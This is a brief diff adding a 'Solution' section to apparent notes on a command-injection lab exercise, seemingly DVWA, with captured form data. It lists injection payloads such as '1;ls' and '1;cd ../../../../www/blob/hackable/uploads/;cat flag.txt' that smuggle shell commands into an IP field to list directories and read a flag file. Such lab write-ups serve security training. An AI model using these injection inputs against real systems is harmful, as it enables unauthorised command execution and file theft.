@@ -26,3 +26,11 @@ Form data
 ip	192.168.56.102; cat hackable/uploads/flag.txt
 Submit	Submit
 user_token	7eea42d9c24269a8f6dda269700f45b4
+
+Solution
+1;ls    -- To get the list of files
+1;cd source | ls
+
+1;cd ../../../../www/blob/hackable/uploads/;ls
+
+1;cd ../../../../www/blob/hackable/uploads/;cat flag.txt
